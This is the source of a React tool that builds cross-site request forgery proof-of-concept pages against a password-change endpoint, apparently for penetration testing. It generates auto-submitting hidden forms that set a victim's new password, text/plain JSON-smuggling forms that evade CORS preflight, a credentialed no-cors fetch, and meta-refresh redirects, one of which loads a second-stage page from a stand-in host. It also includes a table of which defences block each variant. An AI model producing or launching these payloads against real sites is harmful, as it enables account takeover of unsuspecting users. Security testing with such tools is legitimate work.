import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CopyChip,
  DownloadButton,
  OutputBlock,
  SectionTitle,
  Select,
  Tabs,
  TextArea,
  TextInput,
} from '@/components/ui';

type Method = 'POST' | 'GET' | 'PUT' | 'DELETE';
type Enc = 'urlencoded' | 'multipart' | 'text' | 'json';
type View = 'html' | 'fetch' | 'meta' | 'defence';

const ENCODINGS: Array<{ value: Enc; label: string }> = [
  { value: 'urlencoded', label: 'application/x-www-form-urlencoded' },
  { value: 'multipart', label: 'multipart/form-data' },
  { value: 'text', label: 'text/plain (JSON smuggling)' },
  { value: 'json', label: 'application/json (preflight — needs CORS)' },
];

const METHODS: Array<{ value: Method; label: string }> = [
  { value: 'POST', label: 'POST' },
  { value: 'GET', label: 'GET' },
  { value: 'PUT', label: 'PUT' },
  { value: 'DELETE', label: 'DELETE' },
];

const DEFAULT_PARAMS = 'email=victim@example.com\nnew_password=Passw0rd!23\ncsrf_token=TOKEN_FROM_PAGE';

const CONTROLS: Array<[string, string, (p: Params) => string]> = [
  ['SameSite=Lax', 'Cookie withheld on cross-site POST/PUT/DELETE; sent on top-level GET navigation', (p) => (p.method === 'GET' ? 'BYPASSES — top-level GET navigation carries the cookie' : 'BLOCKS — form POST from a third-party origin has no cookie')],
  ['SameSite=Strict', 'Cookie never sent on cross-site navigations', () => 'BLOCKS — every path including top-level GET'],
  ['CSRF token bound to session', 'Server compares a token issued with the page to the submitted value', (p) => (p.token ? 'BLOCKS — the attacker cannot read the token cross-origin' : 'BYPASSES — no token field means no check can pass')],
  ['Double-submit cookie', 'Cookie value must equal a submitted field or header', (p) => (p.token ? 'BLOCKS — the duplicated value cannot be read' : 'BYPASSES — the field is absent, and the cookie travels automatically')],
  ['Origin / Referer check', 'Server rejects requests whose Origin is not its own', () => 'BLOCKS — form posts carry an accurate Origin header'],
  ['SameSite=Lax + no token', 'Lax alone', (p) => (p.method === 'GET' ? 'BYPASSES via top-level navigation' : 'BLOCKS non-GET')],
];

interface Params {
  method: Method;
  enc: Enc;
  token: boolean;
}

const esc = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;');

export default function CsrfPocBuilder() {
  const [target, setTarget] = useState('https://example.com/account/password');
  const [method, setMethod] = useState<Method>('POST');
  const [enc, setEnc] = useState<Enc>('urlencoded');
  const [rows, setRows] = useState(DEFAULT_PARAMS);
  const [token, setToken] = useState(false);
  const [autoSubmit, setAutoSubmit] = useState(true);
  const [view, setView] = useState<View>('html');

  const pairs = useMemo(
    () =>
      rows
        .split('\n')
        .map((l) => l.trim())
        .filter((l) => l && !l.startsWith('#'))
        .map((l) => {
          const i = l.indexOf('=');
          return i < 0 ? [l, ''] as const : [l.slice(0, i), l.slice(i + 1)] as const;
        }),
    [rows],
  );

  const action = target.trim() || 'https://example.com/account/password';
  const params: Params = { method, enc, token };

  const html = useMemo(() => {
    const fields = pairs.map(([k, v]) => `    <input type="hidden" name="${esc(k)}" value="${esc(v)}">`).join('\n');
    const submit = autoSubmit
      ? '  <script>document.forms[0].submit();</script>'
      : '  <button type="submit">Submit</button>';

    if (enc === 'json' || enc === 'text') {
      const json = JSON.stringify(Object.fromEntries(pairs));
      const payload = enc === 'text' ? `{"${pairs.map(([k, v]) => `${k}":"${v}`).join('","')}"}` : json;
      return [
        '<!-- text/plain smuggles a JSON body past CORS preflight; the server must parse it as JSON -->',
        `<form action="${esc(action)}" method="POST" enctype="text/plain" id="p">`,
        `  <input name='${esc(payload)}' value='ignored'>`,
        '</form>',
        submit,
        '',
        '<!-- if the parser needs a leading { or trailing }, nudge with an extra field name:',
        json,
        '-->',
      ].join('\n');
    }

    const encAttr = enc === 'multipart' ? ' enctype="multipart/form-data"' : '';
    return [
      '<!doctype html>',
      '<html><body onload="' + (autoSubmit ? 'document.forms[0].submit()' : '') + '">',
      `<form action="${esc(action)}" method="${method}"${encAttr}>`,
      fields,
      '</form>',
      submit,
      '</body></html>',
    ].join('\n');
  }, [pairs, action, method, enc, autoSubmit]);

  const fetchPoc = useMemo(() => {
    const body =
      enc === 'urlencoded'
        ? `new URLSearchParams(${JSON.stringify(Object.fromEntries(pairs))})`
        : enc === 'multipart'
          ? 'await new FormData(form)'
          : JSON.stringify(Object.fromEntries(pairs));
    const ct = enc === 'urlencoded' ? 'application/x-www-form-urlencoded' : enc === 'multipart' ? 'multipart (browser sets boundary)' : 'text/plain';
    return [
      '// fetch PoC — same-origin only unless the target sends CORS headers',
      'const form = new FormData();',
      ...pairs.map(([k, v]) => `form.append(${JSON.stringify(k)}, ${JSON.stringify(v)});`),
      '',
      `fetch(${JSON.stringify(action)}, {`,
      `  method: '${method}',`,
      '  mode: \'no-cors\',      // opaque response: the request still lands',
      '  credentials: \'include\', // same-origin only — cross-site cookies need SameSite=None',
      enc === 'multipart' ? "  body: form," : `  body: ${body},`,
      `  headers: { 'Content-Type': '${ct}' },`,
      '}).catch(() => {});',
    ].join('\n');
  }, [pairs, action, method, enc]);

  const metaPoc = useMemo(
    () =>
      [
        '<!-- GET-only variant: navigates the top frame, no form needed -->',
        `<meta http-equiv="refresh" content="0; url=${esc(action)}?${pairs.map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')}">`,
        '',
        '<!-- combined: meta refresh to a page that carries the auto-submitting form -->',
        `<meta http-equiv="refresh" content="0; url=https://oast.example.com/stage2.html">`,
      ].join('\n'),
    [action, pairs],
  );

  const multipart = useMemo(() => {
    const boundary = '----WebKitFormBoundaryRF7xQ2';
    const parts = pairs.map(
      ([k, v]) => `Content-Disposition: form-data; name="${k}"\r\n\r\n${v}`,
    );
    return [
      `POST /path HTTP/1.1`,
      `Host: ${action.replace(/^https?:\/\//, '').split('/')[0] ?? 'example.com'}`,
      `Content-Type: multipart/form-data; boundary=${boundary}`,
      '',
      parts.map((p) => `--${boundary}\r\n${p}\r\n`).join(''),
      `--${boundary}--`,
    ].join('\n');
  }, [pairs, action]);

  const verdicts = useMemo(
    () => CONTROLS.map(([name, effect, fn]) => [name, effect, fn(params)] as const),
    [method, token],
  );

  return (
    <>
      <Card title="Request">
        <div className="grid gap-4 sm:grid-cols-2">
          <TextInput label="Target URL" value={target} onChange={setTarget} mono placeholder="https://example.com/account/password" hint="Exact action the form posts to" />
          <Select label="Method" value={method} onChange={setMethod} options={METHODS} hint={method === 'GET' ? 'GET needs no form — a top-level navigation is enough' : 'Non-GET methods require a form (or a CORS-enabled fetch)'} />
          <Select label="Content type" value={enc} onChange={setEnc} options={ENCODINGS} hint={enc === 'json' ? 'JSON triggers a preflight; only viable when the target sends CORS headers' : enc === 'text' ? 'text/plain is a simple request — no preflight, body smuggled as JSON' : enc === 'multipart' ? 'multipart is also a simple request, with a boundary the server must parse' : 'The classic simple request; no preflight'} />
          <div className="flex items-end gap-4 pb-1">
            <Checkbox checked={token} onChange={setToken} label="Token field required" description="Simulate a token-protected endpoint" />
            <Checkbox checked={autoSubmit} onChange={setAutoSubmit} label="Auto-submit" description="Submit on load" />
          </div>
        </div>
        <div className="mt-4">
          <TextArea
            label="Parameters — one name=value per line"
            value={rows}
            onChange={setRows}
            rows={6}
            placeholder={'email=victim@example.com\nnew_password=Passw0rd!23'}
            hint="Order is preserved; # comments are dropped"
          />
        </div>
      </Card>

      <Card
        title="Proof of concept"
        action={<DownloadButton text={html} filename="csrf-poc.html" label="Download .html" />}
      >
        <Tabs
          value={view}
          onChange={setView}
          tabs={[
            { value: 'html', label: 'HTML form' },
            { value: 'fetch', label: 'fetch' },
            { value: 'meta', label: 'meta refresh' },
            { value: 'defence', label: 'Defences' },
          ]}
        />
        <div className="mt-3">
          {view === 'html' && (
            <>
              <OutputBlock value={html} rows={14} label={`${method} · ${enc}`} />
              <div className="mt-4">
                <SectionTitle>Raw multipart body</SectionTitle>
                <OutputBlock value={multipart} rows={10} label="Wire format" />
              </div>
            </>
          )}
          {view === 'fetch' && <OutputBlock value={fetchPoc} rows={16} label="fetch() variant" />}
          {view === 'meta' && <OutputBlock value={metaPoc} rows={6} label="meta refresh variant" />}
          {view === 'defence' && (
            <div className="overflow-x-auto">
              <table className="w-full border-collapse text-[12.5px]">
                <thead>
                  <tr className="text-left text-[11px] uppercase tracking-wide text-[var(--text-faint)]">
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Control</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">Expected behaviour</th>
                    <th className="border-b border-[var(--card-border)] px-2 py-1.5">This PoC</th>
                  </tr>
                </thead>
                <tbody>
                  {verdicts.map(([name, effect, verdict]) => (
                    <tr key={name} className="align-top">
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 rf-mono text-[var(--text)]">{name}</td>
                      <td className="border-b border-[var(--card-border)] px-2 py-1.5 text-[var(--text-muted)]">{effect}</td>
                      <td
                        className="border-b border-[var(--card-border)] px-2 py-1.5 font-medium"
                        style={{ color: verdict.startsWith('BLOCKS') ? 'var(--ok)' : 'var(--accent)' }}
                      >
                        {verdict}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </Card>

      <Card title="Encoding notes">
        <div className="flex flex-wrap gap-2">
          <CopyChip text={html} label="copy PoC" />
          <CopyChip text={multipart} label="copy multipart body" />
          <CopyChip text={metaPoc} label="copy meta variant" />
        </div>
        <div className="mt-4">
          <Callout tone="info" title="enctype decides what the server sees">
            <ul className="m-0 list-disc pl-5">
              <li><strong>urlencoded</strong> — one body, <span className="rf-mono">a=1&amp;b=2</span>; the default when <span className="rf-mono">enctype</span> is omitted.</li>
              <li><strong>multipart</strong> — boundary-delimited parts; needed for file fields, but any parser that accepts both must be tested separately.</li>
              <li><strong>text/plain</strong> — the browser writes <span className="rf-mono">name=value</span> lines with no quoting, so a crafted field name smuggles arbitrary text; a JSON parser on the server turns that into a full JSON body.</li>
              <li><strong>application/json</strong> — forms cannot send it; only fetch/XHR can, and that triggers a preflight the attacker cannot satisfy without CORS.</li>
            </ul>
          </Callout>
        </div>
      </Card>
    </>
  );
}
